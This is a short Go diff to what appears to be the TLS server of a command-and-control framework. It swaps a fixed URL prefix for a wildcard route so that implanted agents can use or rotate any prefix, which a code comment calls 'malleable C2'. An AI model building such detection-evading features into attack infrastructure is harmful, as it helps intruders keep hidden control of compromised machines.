@@ -24,11 +24,9 @@ func StartC2AgentTLSServer() {
 	}
 	r := mux.NewRouter()
 	transport.CACrtPEM = []byte(live.RuntimeConfig.CAPEM)
-	prefix := live.RuntimeConfig.C2Prefix
-	if prefix == "" {
-		prefix = transport.WebRoot
-	}
-	r.HandleFunc(fmt.Sprintf("/%s/{api}/{token}", prefix), apiDispatcher)
+	// Allow any prefix to effectively implement "malleable C2"
+	// The agent can use any prefix it wants, or rotate them
+	r.HandleFunc("/{prefix}/{api}/{token}", apiDispatcher)
 	if network.EmpTLSServer != nil {
 		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
 	}
